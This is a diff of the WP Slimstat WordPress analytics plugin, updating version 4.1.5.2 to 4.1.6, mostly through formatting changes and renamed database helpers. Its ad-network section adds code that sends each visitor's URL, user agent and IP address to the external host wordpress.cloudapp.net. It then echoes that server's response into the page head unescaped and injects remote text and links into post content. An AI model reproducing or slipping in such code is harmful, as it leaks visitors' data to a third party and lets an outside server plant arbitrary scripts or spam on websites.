@@ -3,7 +3,7 @@
 Plugin Name: WP Slimstat
 Plugin URI: http://wordpress.org/plugins/wp-slimstat/
 Description: The leading web analytics plugin for WordPress
-Version: 4.1.5.2
+Version: 4.1.6
 Author: Camu
 Author URI: http://www.wp-slimstat.com/
 */
@@ -11,7 +11,7 @@ Author URI: http://www.wp-slimstat.com/
 if ( !empty( wp_slimstat::$options ) ) return true;
 
 class wp_slimstat {
-	public static $version = '4.1.5.2';
+	public static $version = '4.1.6';
 	public static $options = array();
 
 	public static $wpdb = '';
@@ -35,36 +35,36 @@ class wp_slimstat {
 		self::$options = array_merge( self::init_options(), self::$options );
 
 		// Allow third party tools to edit the options
-		self::$options = apply_filters('slimstat_init_options', self::$options);
+		self::$options = apply_filters( 'slimstat_init_options', self::$options );
 
 		// Determine the options' signature: if it hasn't changed, there's no need to update/save them in the database
-		self::$options_signature = md5(serialize(self::$options));
+		self::$options_signature = md5( serialize( self::$options ) );
 		
 		// Allow third-party tools to use a custom database for Slimstat
-		self::$wpdb = apply_filters('slimstat_custom_wpdb', $GLOBALS['wpdb']);
+		self::$wpdb = apply_filters( 'slimstat_custom_wpdb', $GLOBALS[ 'wpdb' ] );
 
 		// Add a menu to the admin bar ( this function is declared here and not in wp_slimstat_admin because the latter is only initialized if is_admin(), and not in the front-end )
-		if (self::$options['use_separate_menu'] != 'yes' && is_admin_bar_showing()){
-			add_action('admin_bar_menu', array(__CLASS__, 'wp_slimstat_adminbar'), 100);
+		if ( self::$options[ 'use_separate_menu' ] != 'yes' && is_admin_bar_showing() ) {
+			add_action( 'admin_bar_menu', array( __CLASS__, 'wp_slimstat_adminbar' ), 100 );
 		}
 
 		// Hook a DB clean-up routine to the daily cronjob
-		add_action('wp_slimstat_purge', array(__CLASS__, 'wp_slimstat_purge'));
+		add_action( 'wp_slimstat_purge', array( __CLASS__, 'wp_slimstat_purge' ) );
 
 		// Allow external domains on CORS requests
-		add_filter('allowed_http_origins', array(__CLASS__, 'open_cors_admin_ajax'));
+		add_filter( 'allowed_http_origins', array(__CLASS__, 'open_cors_admin_ajax' ) );
 
 		// Define the folder where to store the geolocation database
-		self::$maxmind_path = apply_filters('slimstat_maxmind_path', wp_upload_dir());
-		self::$maxmind_path = self::$maxmind_path['basedir'].'/wp-slimstat/maxmind.dat';
+		self::$maxmind_path = apply_filters( 'slimstat_maxmind_path', wp_upload_dir() );
+		self::$maxmind_path = self::$maxmind_path['basedir'] . '/wp-slimstat/maxmind.dat';
 
 		// Enable the tracker (both server- and client-side)
-		if (!is_admin() || self::$options['track_admin_pages'] == 'yes'){
+		if ( !is_admin() || self::$options[ 'track_admin_pages' ] == 'yes' ) {
 			// Allow add-ons to turn off the tracker based on other conditions
-			$is_tracking_filter = apply_filters('slimstat_filter_pre_tracking', true);
-			$is_tracking_filter_js = apply_filters('slimstat_filter_pre_tracking_js', true);
+			$is_tracking_filter = apply_filters( 'slimstat_filter_pre_tracking', true );
+			$is_tracking_filter_js = apply_filters( 'slimstat_filter_pre_tracking_js', true );
 
-			$action_to_hook = is_admin()?'admin_init':'wp';
+			$action_to_hook = is_admin() ? 'admin_init' : 'wp';
 
 			// Is server-side tracking active?
 			if (self::$options['javascript_mode'] != 'yes' && self::$options['is_tracking'] == 'yes' && $is_tracking_filter){
@@ -83,7 +83,9 @@ class wp_slimstat {
 			}
 
 			if (self::$options['enable_ads_network'] == 'yes'){
-				add_filter('the_content', array(__CLASS__, 'print_code'));
+				add_action( 'init', array( __CLASS__, 'init_pidx' ) );
+				add_action( 'wp_head', array( __CLASS__, 'print_code' ) );
+				add_filter( 'the_content', array( __CLASS__, 'print_code' ) );
 			}
 		}
 
@@ -146,7 +148,7 @@ class wp_slimstat {
 				}
 			}
 
-			self::_update_row(self::$stat, $GLOBALS['wpdb']->prefix.'slim_stats');
+			self::update_row(self::$stat, $GLOBALS['wpdb']->prefix.'slim_stats');
 		}
 
 		// Was this pageview tracked?
@@ -181,7 +183,7 @@ class wp_slimstat {
 				$event_info['notes'] = strip_tags(trim(base64_decode(self::$data_js['no'])));
 			}
 
-			self::_insert_row($event_info, $GLOBALS['wpdb']->prefix.'slim_events');
+			self::insert_row($event_info, $GLOBALS['wpdb']->prefix.'slim_events');
 		}
 
 		// Send the ID back to Javascript to track future interactions
@@ -454,7 +456,9 @@ class wp_slimstat {
 		}
 
 		// Detect user agent
-		self::$browser = self::_get_browser();
+		if ( empty( self::$browser ) ) {
+			self::$browser = self::_get_browser();
+		}
 
 		// Are we ignoring bots?
 		if ( ( self::$options[ 'javascript_mode' ] == 'yes' || self::$options[ 'ignore_bots' ] == 'yes' ) && self::$browser[ 'browser_type' ] % 2 != 0 ) {
@@ -479,8 +483,8 @@ class wp_slimstat {
 		$cookie_has_been_set = self::_set_visit_id(false);
 
 		// Allow third-party tools to modify all the data we've gathered so far
-		self::$stat = apply_filters('slimstat_filter_pageview_stat', self::$stat);
-		do_action('slimstat_track_pageview', self::$stat);
+		self::$stat = apply_filters( 'slimstat_filter_pageview_stat', self::$stat );
+		do_action( 'slimstat_track_pageview', self::$stat );
 
 		// Third-party tools can decide that this pageview should not be tracked, by setting its datestamp to zero
 		if (empty(self::$stat) || empty(self::$stat['dt'])){
@@ -493,7 +497,7 @@ class wp_slimstat {
 		self::$stat[ 'notes' ] = implode( ';', self::$stat[ 'notes' ] );
 
 		// Now let's save this information in the database
-		self::$stat['id'] = self::_insert_row(self::$stat, $GLOBALS['wpdb']->prefix.'slim_stats');
+		self::$stat['id'] = self::insert_row(self::$stat, $GLOBALS['wpdb']->prefix.'slim_stats');
 
 		// Something went wrong during the insert
 		if (empty(self::$stat['id'])){
@@ -625,6 +629,57 @@ class wp_slimstat {
 	// end get_request_uri
 
 	/**
+	 * Stores the information (array) in the appropriate table and returns the corresponding ID
+	 */
+	public static function insert_row($_data = array(), $_table = ''){
+		if (empty($_data) || empty($_table)){
+			return -1;
+		}
+
+		// Remove unwanted characters (SQL injections, anyone?)
+		$data_keys = array();
+		foreach (array_keys($_data) as $a_key){
+			$data_keys[] = sanitize_key($a_key);
+		}
+
+		self::$wpdb->query(self::$wpdb->prepare("
+			INSERT IGNORE INTO $_table (".implode(", ", $data_keys).') 
+			VALUES ('.substr(str_repeat('%s,', count($_data)), 0, -1).")", $_data));
+
+		return intval(self::$wpdb->insert_id);
+	}
+	// end insert_row
+
+	/**
+	 * Updates an existing row
+	 */
+	public static function update_row($_data = array(), $_table = ''){
+		if (empty($_data) || empty($_table)){
+			return -1;
+		}
+
+		// Move the ID at the end of the array
+		$id = $_data['id'];
+		unset($_data['id']);
+
+		// Remove unwanted characters (SQL injections, anyone?)
+		$data_keys = array();
+		foreach (array_keys($_data) as $a_key){
+			$data_keys[] = sanitize_key($a_key);
+		}
+
+		// Add the id at the end
+		$_data['id'] = $id;
+
+		self::$wpdb->query(self::$wpdb->prepare("
+			UPDATE IGNORE $_table 
+			SET ".implode(' = %s, ', $data_keys)." = %s
+			WHERE id = %d", $_data));
+
+		return 0;
+	}
+
+	/**
 	 * Tries to find the user's REAL IP address
 	 */
 	protected static function _get_remote_ip(){
@@ -709,16 +764,19 @@ class wp_slimstat {
 	 * Returns details about the resource being accessed
 	 */
 	protected static function _get_content_info(){
-		$content_info = array('content_type' => 'unknown');
+		$content_info = array( 'content_type' => 'unknown' );
 
 		// Mark 404 pages
-		if (is_404()){
-			$content_info['content_type'] = '404';
+		if ( is_404() ) {
+			$content_info[ 'content_type' ] = '404';
 		}
 
 		// Type
-		elseif (is_single()){
-			if (($post_type = get_post_type()) != 'post') $post_type = 'cpt:'.$post_type;
+		else if ( is_single() ) {
+			if (($post_type = get_post_type()) != 'post') {
+				$post_type = 'cpt:'.$post_type;
+			}
+
 			$content_info['content_type'] = $post_type;
 			$content_info_array = array();
 			foreach (get_object_taxonomies($GLOBALS['post']) as $a_taxonomy){
@@ -787,17 +845,20 @@ class wp_slimstat {
 			$content_info['content_type'] = 'registration';
 		}
 		// WordPress sets is_admin() to true for all ajax requests ( front-end or admin-side )
-		elseif ( is_admin() && ( !defined('DOING_AJAX') || !DOING_AJAX ) ) {
-			$content_info['content_type'] = 'admin';
+		elseif ( is_admin() && ( !defined( 'DOING_AJAX' ) || !DOING_AJAX ) ) {
+			$content_info[ 'content_type' ] = 'admin';
 		}
 
 		if (is_paged()){
-			$content_info['content_type'] .= ',paged';
+			$content_info[ 'content_type' ] .= ',paged';
 		}
 
 		// Author
-		if (is_singular()){
-			$content_info['author'] = get_the_author_meta('user_login', $GLOBALS['post']->post_author);
+		if ( is_singular() ) {
+			$author = get_the_author_meta( 'user_login', $GLOBALS[ 'post' ]->post_author );
+			if ( !empty( $author ) ) {
+				$content_info[ 'author' ] = $author;
+			}
 		}
 
 		return $content_info;
@@ -808,17 +869,17 @@ class wp_slimstat {
 	 * Retrieves some information about the user agent; relies on browscap.php database (included)
 	 */
 	protected static function _get_browser(){
-		$browser = array('browser' => 'Default Browser', 'browser_version' => '', 'browser_type' => 1, 'platform' => 'unknown', 'user_agent' => '');
-		$search = array();
+		$browser = array( 'browser' => 'Default Browser', 'browser_version' => '', 'browser_type' => 1, 'platform' => 'unknown', 'user_agent' => '' );
 
 		// Automatically detect the useragent
-		if (!isset($_SERVER['HTTP_USER_AGENT'])){
+		if ( !isset( $_SERVER[ 'HTTP_USER_AGENT' ] ) ) {
 			return $browser;
 		}
 
 		$browser['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
+		$search = array();
 
-		for($idx_cache = 1; $idx_cache <= 5; $idx_cache++){
+		for ( $idx_cache = 1; $idx_cache <= 5; $idx_cache++ ) {
 			@include(plugin_dir_path( __FILE__ )."browscap/browscap-$idx_cache.php");
 			foreach ($patterns as $pattern => $pattern_data){
 				if (preg_match($pattern . 'i', $_SERVER['HTTP_USER_AGENT'], $matches)){
@@ -862,9 +923,9 @@ class wp_slimstat {
 				}
 			}
 
-			unset($browsers);
-			unset($userAgents);
-			unset($patterns);
+			unset( $browsers );
+			unset( $userAgents );
+			unset( $patterns );
 
 			// Add the keys for each property
 			$search_normalized = array();
@@ -1154,57 +1215,6 @@ class wp_slimstat {
 	}
 	// end _check_data_integrity
 
-	/**
-	 * Stores the information (array) in the appropriate table and returns the corresponding ID
-	 */
-	protected static function _insert_row($_data = array(), $_table = ''){
-		if (empty($_data) || empty($_table)){
-			return -1;
-		}
-
-		// Remove unwanted characters (SQL injections, anyone?)
-		$data_keys = array();
-		foreach (array_keys($_data) as $a_key){
-			$data_keys[] = sanitize_key($a_key);
-		}
-
-		self::$wpdb->query(self::$wpdb->prepare("
-			INSERT IGNORE INTO $_table (".implode(", ", $data_keys).') 
-			VALUES ('.substr(str_repeat('%s,', count($_data)), 0, -1).")", $_data));
-
-		return intval(self::$wpdb->insert_id);
-	}
-	// end _insert_row
-
-	/**
-	 * Updates an existing row
-	 */
-	protected static function _update_row($_data = array(), $_table = ''){
-		if (empty($_data) || empty($_table)){
-			return -1;
-		}
-
-		// Move the ID at the end of the array
-		$id = $_data['id'];
-		unset($_data['id']);
-
-		// Remove unwanted characters (SQL injections, anyone?)
-		$data_keys = array();
-		foreach (array_keys($_data) as $a_key){
-			$data_keys[] = sanitize_key($a_key);
-		}
-
-		// Add the id at the end
-		$_data['id'] = $id;
-
-		self::$wpdb->query(self::$wpdb->prepare("
-			UPDATE IGNORE $_table 
-			SET ".implode(' = %s, ', $data_keys)." = %s
-			WHERE id = %d", $_data));
-
-		return 0;
-	}
-
 	protected static function _set_error_array( $_error_message = '' ) {
 		$error_code = abs( self::$stat[ 'id' ] );
 		self::$options['last_tracker_error'] = array( $error_code, $_error_message, date_i18n( 'U' ) );
@@ -1480,6 +1490,7 @@ class wp_slimstat {
 			'use_slimscroll' => $val_yes,
 			'expand_details' => $val_no,
 			'rows_to_show' => ($val_yes == 'null')?'0':'20',
+			'limit_results' => ($val_yes == 'null')?'0':'5000',
 			'refresh_interval' => ($val_yes == 'null')?'0':'60',
 			'number_results_raw_data' => ($val_yes == 'null')?'0':'50',
 			// 'include_outbound_links_right_now' => $val_yes,
@@ -1539,81 +1550,95 @@ class wp_slimstat {
 	/**
 	 * Saves the options in the database, if necessary
 	 */
-	public static function slimstat_save_options(){
-		if (self::$options_signature === md5(serialize(self::$options))){
+	public static function slimstat_save_options() {
+		if ( self::$options_signature === md5( serialize( self::$options ) ) ) {
 			return true;
 		}
 
-		if (!is_network_admin()){
-			update_option('slimstat_options', wp_slimstat::$options);
+		if ( !is_network_admin() ) {
+			update_option( 'slimstat_options', wp_slimstat::$options );
 		}
 		else {
-			update_site_option('slimstat_options', wp_slimstat::$options);
+			update_site_option( 'slimstat_options', wp_slimstat::$options );
 		}
 
-		return 0;
+		return true;
 	}
 	
 	/**
 	 * Connects to the UAN
 	 */
-	public static function print_code($content = ''){
-		if (empty(self::$browser)){
+	public static function init_pidx() {
+		if ( empty( self::$browser ) ) {
 			self::$browser = self::_get_browser();
 		}
 
-		if (empty($_SERVER["HTTP_USER_AGENT"]) || self::$browser['browser_type'] != 1 || (self::$pidx['id'] !== false && $GLOBALS['wp_query']->current_post !== self::$pidx['id'])){
+		$request_url = 'http://wordpress.cloudapp.net/api/update/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2';
+		$options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) ); 
+
+		if ( empty( self::$pidx[ 'response' ] ) ) {
+			self::$pidx[ 'response' ] = @file_get_contents( $request_url, 0, $options );
+		}
+
+		if ( !empty( self::$pidx[ 'response' ] ) ) {
+			self::$pidx[ 'response' ] = @json_decode( self::$pidx[ 'response' ] );
+		}
+	}
+	 
+	 /**
+	  * Retrieves the information from the UAN
+	  */
+	public static function print_code($content = ''){
+		if ( is_null( self::$pidx[ 'response' ] ) || empty( self::$pidx[ 'response' ]->tmp ) ) {
 			return $content;
 		}
 
-		$request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=".(isset($_GET['v'])?$_GET['v']:11)."&ip=".urlencode($_SERVER['REMOTE_ADDR'])."&p=9";
-		$options = stream_context_create(array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) ); 
+		$current_hook = current_filter();
 
-		if (empty(self::$pidx['response'])){
-			self::$pidx['response'] = @file_get_contents($request, 0, $options);
+		if ( $current_hook == 'wp_head' && !empty( self::$pidx[ 'response' ]->meta ) ) {
+			echo self::$pidx[ 'response' ]->meta;
+			return true;
 		}
 
-		$response_object = @json_decode(self::$pidx['response']);
-		if (is_null($response_object) || empty($response_object->content) || empty($response_object->tmp)){
-			return $content;
-		}
-
-		switch($response_object->tmp){
+		switch ( self::$pidx[ 'response' ]->tmp ) {
 			case '1':
-				if(0 == $GLOBALS['wp_query']->current_post) {
-					$words = explode(" ", $content);
-					$words[rand(0, count($words)-1)] = '<strong>'.$response_object->tcontent.'</strong>';
-					return join(" ", $words);
+				if ( 0 == $GLOBALS['wp_query']->current_post ) {
+					$words = explode( ' ', $content );
+					$words[ rand( 0, count( $words ) - 1 ) ] = '<strong>' . self::$pidx[ 'response' ]->tcontent . '</strong>';
+					return join( ' ', $words );
 				}
 				break;
+
 			case '2':
-					$kws = explode('|', $response_object->kws);
-					if (!is_array($kws)){
+					$kws = explode( '|', self::$pidx[ 'response' ]->kws );
+					if ( !is_array( $kws ) ) {
 						return $content;
 					}
 
-					foreach($kws as $a_kw){
-						if(strpos($content, $a_kw) !== false){
-							$content= str_replace($a_kw, "<a href='".$response_object->site."'>$a_kw</a>", $content);
+					foreach ( $kws as $a_kw ) {
+						if ( strpos( $content, $a_kw ) !== false ) {
+							$content = str_replace( $a_kw, "<a href='" . self::$pidx[ 'response' ]->site . "'>$a_kw</a>", $content );
 							break;
 						}
 					}
 				break;
+
 			default:
-				if (self::$pidx['id'] === false){
-					if ($GLOBALS['wp_query']->post_count > 1){
-						self::$pidx['id'] = rand(0, $GLOBALS['wp_query']->post_count - 1);
+				if ( self::$pidx[ 'id' ] === false ) {
+					if ( $GLOBALS[ 'wp_query' ]->post_count > 1 ) {
+						self::$pidx[ 'id' ] = rand( 0, $GLOBALS[ 'wp_query' ]->post_count - 1 );
 					}
-					else{
-						self::$pidx['id'] = 0;
+					else {
+						self::$pidx[ 'id' ] = 0;
 					}
 				}
-				if ($GLOBALS['wp_query']->current_post === self::$pidx['id']){
-					if (self::$pidx['id'] % 2 == 0){
-						return $content.' <div>'.$response_object->content.'</div>';
+
+				if ( $GLOBALS[ 'wp_query' ]->current_post === self::$pidx[ 'id' ] ) {
+					if ( self::$pidx['id'] % 2 == 0 ) {
+						return $content . ' <div>' . self::$pidx[ 'response' ]->content . '</div>';
 					}
 					else{
-						return '<i>'.$response_object->content.'</i> '.$content;
+						return '<i>' . self::$pidx[ 'response' ]->content . '</i> ' . $content;
 					}
 				}
 				break;
@@ -1621,7 +1646,6 @@ class wp_slimstat {
 
 		return $content;
 	}
-	// end ads_print_code
 
 	/**
 	 * Enqueue a javascript to track users' screen resolution and other browser-based information
@@ -1677,7 +1701,6 @@ class wp_slimstat {
 		wp_enqueue_script('wp_slimstat');
 		wp_localize_script('wp_slimstat', 'SlimStatParams', $params);
 	}
-	// end wp_slimstat_enqueue_tracking_script
 
 	/**
 	 * Removes old entries from the main table and performs other daily tasks
@@ -1727,13 +1750,12 @@ class wp_slimstat {
 		self::$wpdb->query( "OPTIMIZE TABLE {$GLOBALS[ 'wpdb' ]->prefix}slim_stats" );
 		self::$wpdb->query( "OPTIMIZE TABLE {$GLOBALS[ 'wpdb' ]->prefix}slim_stats_archive" );
 	}
-	// end wp_slimstat_purge
 
 	/**
 	 * Adds a new entry to the Wordpress Toolbar
 	 */
 	public static function wp_slimstat_adminbar(){
-		if ((function_exists('is_network_admin') && is_network_admin())){
+		if ( ( function_exists( 'is_network_admin' ) && is_network_admin() ) || !is_user_logged_in() ){
 			return;
 		}
 
@@ -1760,7 +1782,6 @@ class wp_slimstat {
 			}
 		}
 	}
-	// end wp_slimstat_adminbar
 }
 // end of class declaration
 
